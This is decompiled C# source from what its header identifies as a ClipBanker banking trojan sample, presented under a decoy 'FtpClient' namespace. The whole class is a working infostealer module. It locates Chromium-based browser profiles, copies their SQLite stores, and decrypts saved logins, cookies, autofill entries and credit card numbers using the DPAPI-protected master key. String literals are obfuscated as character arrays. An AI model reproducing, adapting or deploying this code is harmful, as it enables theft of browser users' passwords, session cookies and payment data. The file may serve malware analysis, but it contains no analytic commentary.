// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Browsers.Chromium.ChrmBrowser
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Extensions;
using FtpClient.Data.Helpers;
using FtpClient.Models.Browsers;
using FtpClient.Models.Info;
using FtpClient.Models.Serialization;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace FtpClient.Data.Browsers.Chromium
{
  public static class ChrmBrowser
  {
    public static List<InfoClass12> Get(IList<string> profiles)
    {
      List<InfoClass12> infoClass12List = new List<InfoClass12>();
      try
      {
        object obj = new object();
        foreach (string profile in (IEnumerable<string>) profiles)
        {
          bool flag = false;
          int num1 = 1;
          while (!flag)
          {
            InfoClass12 infoClass12 = new InfoClass12();
            string dataFolder = string.Empty;
            string empty = string.Empty;
            try
            {
              dataFolder = new FileInfo(profile).Directory.FullName;
              string str1;
              if (dataFolder.Contains(new string(new char[15]
              {
                'O',
                'p',
                'e',
                'r',
                'a',
                ' ',
                'G',
                'X',
                ' ',
                'S',
                't',
                'a',
                'b',
                'l',
                'e'
              })))
                str1 = new string(new char[8]
                {
                  'O',
                  'p',
                  'e',
                  'r',
                  'a',
                  ' ',
                  'G',
                  'X'
                });
              else
                str1 = profile.Contains(FtpClient.Data.Helpers.Constants.RoamingAppData) ? ChrmBrowser.GetRoamingName(dataFolder) : ChrmBrowser.GetLocalName(dataFolder);
              if (!string.IsNullOrEmpty(str1))
              {
                string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
                string name = ChrmBrowser.GetName(dataFolder);
                if (!string.IsNullOrEmpty(name))
                {
                  infoClass12.Object1 = str2;
                  infoClass12.Object2 = name;
                  infoClass12.Object3 = (IList<InfoClass4>) ChrmBrowser.MakeTries<List<InfoClass4>>((Func<List<InfoClass4>>) (() => ChrmBrowser.EnumPasswords(dataFolder)), (Func<List<InfoClass4>, bool>) (x => x.Count > 0)).IsNull<List<InfoClass4>>();
                  infoClass12.Object6 = (IList<InfoClass13>) ChrmBrowser.MakeTries<List<InfoClass13>>((Func<List<InfoClass13>>) (() => ChrmBrowser.EnumCook(dataFolder)), (Func<List<InfoClass13>, bool>) (x => x.Count > 0)).IsNull<List<InfoClass13>>();
                  infoClass12.Object4 = (IList<InfoClass11>) ChrmBrowser.MakeTries<List<InfoClass11>>((Func<List<InfoClass11>>) (() => ChrmBrowser.EnumFills(dataFolder)), (Func<List<InfoClass11>, bool>) (x => x.Count > 0)).IsNull<List<InfoClass11>>();
                  infoClass12.Object5 = (IList<InfoClass14>) ChrmBrowser.MakeTries<List<InfoClass14>>((Func<List<InfoClass14>>) (() => ChrmBrowser.EnumCC(dataFolder)), (Func<List<InfoClass14>, bool>) (x => x.Count > 0)).IsNull<List<InfoClass14>>();
                }
              }
            }
            catch (Exception ex)
            {
            }
            lock (obj)
            {
              IList<InfoClass13> object6 = infoClass12.Object6;
              int num2;
              if ((object6 != null ? (object6.Count > 0 ? 1 : 0) : 0) == 0)
              {
                IList<InfoClass4> object3 = infoClass12.Object3;
                if ((object3 != null ? (object3.Count > 0 ? 1 : 0) : 0) == 0)
                {
                  IList<InfoClass14> object5 = infoClass12.Object5;
                  if ((object5 != null ? (object5.Count > 0 ? 1 : 0) : 0) == 0)
                  {
                    IList<InfoClass11> object4 = infoClass12.Object4;
                    num2 = object4 != null ? (object4.Count > 0 ? 1 : 0) : 0;
                    goto label_19;
                  }
                }
              }
              num2 = 1;
label_19:
              if (num2 != 0)
              {
                flag = true;
                infoClass12List.Add(infoClass12);
              }
              else
                ++num1;
            }
            if (num1 > 2)
              flag = true;
          }
        }
      }
      catch
      {
      }
      return infoClass12List;
    }

    private static List<InfoClass4> EnumPasswords(string profilePath)
    {
      List<InfoClass4> infoClass4List = new List<InfoClass4>();
      try
      {
        string str = Path.Combine(profilePath, new string(new char[10]
        {
          'L',
          'o',
          'g',
          'i',
          'n',
          ' ',
          'D',
          'a',
          't',
          'a'
        }));
        if (!File.Exists(str))
          return infoClass4List;
        string localStateKey = ChrmBrowser.ParseLocalStateKey(profilePath);
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
        try
        {
          SqlConnection manager = new SqlConnection(temp);
          manager.ReadTable(new string(new char[6]
          {
            'l',
            'o',
            'g',
            'i',
            'n',
            's'
          }));
          for (int row = 0; row < manager.RowLength; ++row)
          {
            InfoClass4 infoClass4 = new InfoClass4();
            try
            {
              infoClass4 = ChrmBrowser.ReadData(manager, row, localStateKey);
            }
            catch (Exception ex)
            {
            }
            if (infoClass4.Object3 != "UNKNOWN")
              infoClass4List.Add(infoClass4);
          }
        }
        catch (Exception ex)
        {
        }
        finally
        {
          if (createdNew)
            new FileInfo(temp).Delete();
        }
      }
      catch (Exception ex)
      {
      }
      return infoClass4List;
    }

    private static List<InfoClass13> EnumCook(string profilePath)
    {
      List<InfoClass13> infoClass13List = new List<InfoClass13>();
      try
      {
        string str = Path.Combine(profilePath, new string(new char[7]
        {
          'C',
          'o',
          'o',
          'k',
          'i',
          'e',
          's'
        }));
        if (!File.Exists(str))
          return infoClass13List;
        string localStateKey = ChrmBrowser.ParseLocalStateKey(profilePath);
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
        try
        {
          SqlConnection sqlConnection = new SqlConnection(temp);
          sqlConnection.ReadTable(new string(new char[7]
          {
            'c',
            'o',
            'o',
            'k',
            'i',
            'e',
            's'
          }));
          for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
          {
            InfoClass13 infoClass13 = (InfoClass13) null;
            try
            {
              infoClass13 = new InfoClass13()
              {
                Object1 = sqlConnection.ParseValue(rowIndex, new string(new char[8]
                {
                  'h',
                  'o',
                  's',
                  't',
                  '_',
                  'k',
                  'e',
                  'y'
                })).Trim(),
                Object2 = (sqlConnection.ParseValue(rowIndex, new string(new char[8]
                {
                  'h',
                  'o',
                  's',
                  't',
                  '_',
                  'k',
                  'e',
                  'y'
                })).Trim().StartsWith(".") ? 1 : 0) != 0,
                Object3 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
                {
                  'p',
                  'a',
                  't',
                  'h'
                })).Trim(),
                Object4 = (sqlConnection.ParseValue(rowIndex, new string(new char[9]
                {
                  'i',
                  's',
                  '_',
                  's',
                  'e',
                  'c',
                  'u',
                  'r',
                  'e'
                })).Contains("1") ? 1 : 0) != 0,
                Object5 = Convert.ToInt64(sqlConnection.ParseValue(rowIndex, new string(new char[11]
                {
                  'e',
                  'x',
                  'p',
                  'i',
                  'r',
                  'e',
                  's',
                  '_',
                  'u',
                  't',
                  'c'
                })).Trim()) / 1000000L - 11644473600L,
                Object6 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
                {
                  'n',
                  'a',
                  'm',
                  'e'
                })).Trim(),
                Object7 = ChrmBrowser.DecryptChromium(sqlConnection.ParseValue(rowIndex, new string(new char[15]
                {
                  'e',
                  'n',
                  'c',
                  'r',
                  'y',
                  'p',
                  't',
                  'e',
                  'd',
                  '_',
                  'v',
                  'a',
                  'l',
                  'u',
                  'e'
                })), localStateKey)
              };
              if (infoClass13.Object5 < 0L)
                infoClass13.Object5 = ChrmBrowser.ToUnixTime(DateTime.Now.AddMonths(12));
            }
            catch
            {
            }
            if (infoClass13 != null)
              infoClass13List.Add(infoClass13);
          }
        }
        catch
        {
        }
        if (createdNew)
          File.Delete(temp);
      }
      catch (Exception ex)
      {
      }
      return infoClass13List;
    }

    public static long ToUnixTime(DateTime date)
    {
      DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
      return Convert.ToInt64((date - dateTime).TotalSeconds);
    }

    private static List<InfoClass11> EnumFills(string profilePath)
    {
      List<InfoClass11> infoClass11List = new List<InfoClass11>();
      try
      {
        string str = Path.Combine(profilePath, new string(new char[8]
        {
          'W',
          'e',
          'b',
          ' ',
          'D',
          'a',
          't',
          'a'
        }));
        if (!File.Exists(str))
          return infoClass11List;
        string localStateKey = ChrmBrowser.ParseLocalStateKey(profilePath);
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
        try
        {
          SqlConnection sqlConnection = new SqlConnection(temp);
          sqlConnection.ReadTable(new string(new char[8]
          {
            'a',
            'u',
            't',
            'o',
            'f',
            'i',
            'l',
            'l'
          }));
          for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
          {
            InfoClass11 infoClass11 = (InfoClass11) null;
            try
            {
              string chiperText = sqlConnection.ParseValue(rowIndex, new string(new char[5]
              {
                'v',
                'a',
                'l',
                'u',
                'e'
              })).Trim();
              int num;
              if (!chiperText.StartsWith(new string(new char[3]
              {
                'v',
                '1',
                '0'
              })))
                num = chiperText.StartsWith(new string(new char[3]
                {
                  'v',
                  '1',
                  '1'
                })) ? 1 : 0;
              else
                num = 1;
              if (num != 0)
                chiperText = ChrmBrowser.DecryptChromium(chiperText, localStateKey);
              infoClass11 = new InfoClass11()
              {
                Object1 = sqlConnection.ParseValue(rowIndex, new string(new char[4]
                {
                  'n',
                  'a',
                  'm',
                  'e'
                })).Trim(),
                Object2 = chiperText
              };
            }
            catch
            {
            }
            if (infoClass11 != null)
              infoClass11List.Add(infoClass11);
          }
        }
        catch
        {
        }
        if (createdNew)
          File.Delete(temp);
      }
      catch (Exception ex)
      {
      }
      return infoClass11List;
    }

    private static List<InfoClass14> EnumCC(string profilePath)
    {
      List<InfoClass14> infoClass14List = new List<InfoClass14>();
      try
      {
        string str = Path.Combine(profilePath, new string(new char[8]
        {
          'W',
          'e',
          'b',
          ' ',
          'D',
          'a',
          't',
          'a'
        }));
        if (!File.Exists(str))
          return infoClass14List;
        string localStateKey = ChrmBrowser.ParseLocalStateKey(profilePath);
        bool createdNew;
        string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
        try
        {
          SqlConnection sqlConnection = new SqlConnection(temp);
          sqlConnection.ReadTable(new string(new char[12]
          {
            'c',
            'r',
            'e',
            'd',
            'i',
            't',
            '_',
            'c',
            'a',
            'r',
            'd',
            's'
          }));
          for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
          {
            InfoClass14 infoClass14 = (InfoClass14) null;
            try
            {
              string number = ChrmBrowser.DecryptChromium(sqlConnection.ParseValue(rowIndex, new string(new char[21]
              {
                'c',
                'a',
                'r',
                'd',
                '_',
                'n',
                'u',
                'm',
                'b',
                'e',
                'r',
                '_',
                'e',
                'n',
                'c',
                'r',
                'y',
                'p',
                't',
                'e',
                'd'
              })), localStateKey).Replace(" ", string.Empty);
              infoClass14 = new InfoClass14()
              {
                Object2 = sqlConnection.ParseValue(rowIndex, new string(new char[12]
                {
                  'n',
                  'a',
                  'm',
                  'e',
                  '_',
                  'o',
                  'n',
                  '_',
                  'c',
                  'a',
                  'r',
                  'd'
                })).Trim(),
                Object3 = Convert.ToInt32(sqlConnection.ParseValue(rowIndex, new string(new char[24]
                {
                  'e',
                  'x',
                  'p',
                  'i',
                  'r',
                  'a',
                  's',
                  '2',
                  '1',
                  'a',
                  't',
                  'i',
                  'o',
                  'n',
                  '_',
                  'm',
                  'o',
                  'a',
                  's',
                  '2',
                  '1',
                  'n',
                  't',
                  'h'
                }).Replace("as21", string.Empty)).Trim()),
                Object4 = Convert.ToInt32(sqlConnection.ParseValue(rowIndex, new string(new char[23]
                {
                  'e',
                  'x',
                  'p',
                  'i',
                  'r',
                  'a',
                  'a',
                  's',
                  '2',
                  '1',
                  't',
                  'i',
                  'o',
                  'n',
                  '_',
                  'y',
                  'a',
                  's',
                  '2',
                  '1',
                  'e',
                  'a',
                  'r'
                }).Replace("as21", string.Empty)).Trim()),
                Object5 = number,
                Object1 = ChrmBrowser.DetectCreditCardType(number)
              };
            }
            catch
            {
            }
            if (infoClass14 != null)
              infoClass14List.Add(infoClass14);
          }
        }
        catch
        {
        }
        if (createdNew)
          File.Delete(temp);
      }
      catch (Exception ex)
      {
      }
      return infoClass14List;
    }

    private static InfoClass4 ReadData(SqlConnection manager, int row, string chromeKey)
    {
      InfoClass4 infoClass4 = new InfoClass4();
      try
      {
        if (((IEnumerable<string>) manager.Fields).Contains<string>(new string(new char[14]
        {
          'P',
          'a',
          's',
          's',
          'w',
          'o',
          'r',
          'd',
          '_',
          'v',
          'a',
          'l',
          'u',
          'e'
        })))
        {
          infoClass4.Object1 = manager.ParseValue(row, new string(new char[10]
          {
            'O',
            'r',
            'i',
            'g',
            'i',
            'n',
            '_',
            'u',
            'r',
            'l'
          })).Trim();
          infoClass4.Object2 = manager.ParseValue(row, new string(new char[14]
          {
            'U',
            's',
            'e',
            'r',
            'n',
            'a',
            'm',
            'e',
            '_',
            'v',
            'a',
            'l',
            'u',
            'e'
          })).Trim();
          infoClass4.Object3 = ChrmBrowser.DecryptChromium(manager.ParseValue(row, new string(new char[14]
          {
            'P',
            'a',
            's',
            's',
            'w',
            'o',
            'r',
            'd',
            '_',
            'v',
            'a',
            'l',
            'u',
            'e'
          })), chromeKey);
        }
        else if (((IEnumerable<string>) manager.Fields).Contains<string>(new string(new char[14]
        {
          'p',
          'a',
          's',
          's',
          'w',
          'o',
          'r',
          'd',
          '_',
          'v',
          'a',
          'l',
          'u',
          'e'
        })))
        {
          infoClass4.Object1 = manager.ParseValue(row, new string(new char[10]
          {
            'o',
            'r',
            'i',
            'g',
            'i',
            'n',
            '_',
            'u',
            'r',
            'l'
          })).Trim();
          infoClass4.Object2 = manager.ParseValue(row, new string(new char[14]
          {
            'u',
            's',
            'e',
            'r',
            'n',
            'a',
            'm',
            'e',
            '_',
            'v',
            'a',
            'l',
            'u',
            'e'
          })).Trim();
          infoClass4.Object3 = ChrmBrowser.DecryptChromium(manager.ParseValue(row, new string(new char[14]
          {
            'p',
            'a',
            's',
            's',
            'w',
            'o',
            'r',
            'd',
            '_',
            'v',
            'a',
            'l',
            'u',
            'e'
          })), chromeKey);
        }
      }
      catch (Exception ex)
      {
      }
      finally
      {
        infoClass4.Object2 = string.IsNullOrWhiteSpace(infoClass4.Object2) ? "UNKNOWN" : infoClass4.Object2;
        infoClass4.Object3 = string.IsNullOrWhiteSpace(infoClass4.Object3) ? "UNKNOWN" : infoClass4.Object3;
        infoClass4.Object1 = string.IsNullOrWhiteSpace(infoClass4.Object1) ? "UNKNOWN" : infoClass4.Object1;
      }
      return infoClass4;
    }

    private static string DecryptChromium(string chiperText, string chromeKey)
    {
      string str = string.Empty;
      try
      {
        int num;
        if (!chiperText.StartsWith(new string(new char[3]
        {
          'v',
          '1',
          '0'
        })))
          num = chiperText.StartsWith(new string(new char[3]
          {
            'v',
            '1',
            '1'
          })) ? 1 : 0;
        else
          num = 1;
        str = num == 0 ? CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim() : ChrmBrowser.DecryptV10(Convert.FromBase64String(chromeKey), chiperText);
      }
      catch (Exception ex)
      {
      }
      return str;
    }

    private static string DecryptV10(byte[] bMasterKey, string chiperText)
    {
      Encoding encoding = Encoding.GetEncoding("windows-1251");
      byte[] numArray = new byte[bMasterKey.Length - 5];
      Array.Copy((Array) bMasterKey, 5, (Array) numArray, 0, bMasterKey.Length - 5);
      byte[] bMasterKey1 = CryptoHelper.DecryptBlob(numArray, DataProtectionScope.CurrentUser);
      return encoding.GetString(AesGcm.Decrypt(encoding.GetBytes(chiperText), bMasterKey1));
    }

    private static string GetName(string path)
    {
      try
      {
        string[] strArray = path.Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        if (strArray[strArray.Length - 2].Contains(new string(new char[9]
        {
          'U',
          's',
          'e',
          'r',
          ' ',
          'D',
          'a',
          't',
          'a'
        })))
          return strArray[strArray.Length - 1];
      }
      catch
      {
      }
      return "Unknown";
    }

    private static string GetRoamingName(string path)
    {
      try
      {
        return path.Split(new string[1]
        {
          new string(new char[16]
          {
            'A',
            'p',
            'p',
            'D',
            'a',
            't',
            'a',
            '\\',
            'R',
            'o',
            'a',
            'm',
            'i',
            'n',
            'g',
            '\\'
          })
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries)[0];
      }
      catch
      {
      }
      return string.Empty;
    }

    private static string GetLocalName(string path)
    {
      try
      {
        string[] strArray = path.Split(new string[1]
        {
          new string(new char[14]
          {
            'A',
            'p',
            'p',
            'D',
            'a',
            't',
            'a',
            '\\',
            'L',
            'o',
            'c',
            'a',
            'l',
            '\\'
          })
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        return strArray[0] + "_[" + strArray[1] + "]";
      }
      catch
      {
      }
      return string.Empty;
    }

    public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
    {
      int num = 1;
      T obj = func();
      while (!success(obj))
      {
        obj = func();
        ++num;
        if (num > 2)
          return obj;
      }
      return obj;
    }

    private static string ParseLocalStateKey(string profilePath)
    {
      string localStateKey = string.Empty;
      string empty = string.Empty;
      try
      {
        string[] source = profilePath.Split(new string[1]
        {
          "\\"
        }, StringSplitOptions.RemoveEmptyEntries);
        string str = Path.Combine(string.Join("\\", ((IEnumerable<string>) source).Take<string>(source.Length - 1).ToArray<string>()), "Local State");
        if (!File.Exists(str))
          str = Path.Combine(profilePath, "Local State");
        if (File.Exists(str))
        {
          try
          {
            bool createdNew;
            string temp = FileSystemHelper.TryCreateTemp(str, out createdNew);
            localStateKey = File.ReadAllText(temp).FromJSON<LocalState>().os_crypt.encrypted_key;
            if (createdNew)
              File.Delete(temp);
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch
      {
      }
      return localStateKey;
    }

    public static string DetectCreditCardType(string number) => FtpClient.Data.Helpers.Constants.CreditCardTypes.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (x => new Regex(x.Value).Match(number.Replace(" ", "")).Success)).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (x => x.Key)).FirstOrDefault<string>() ?? "Unknown";
  }
}
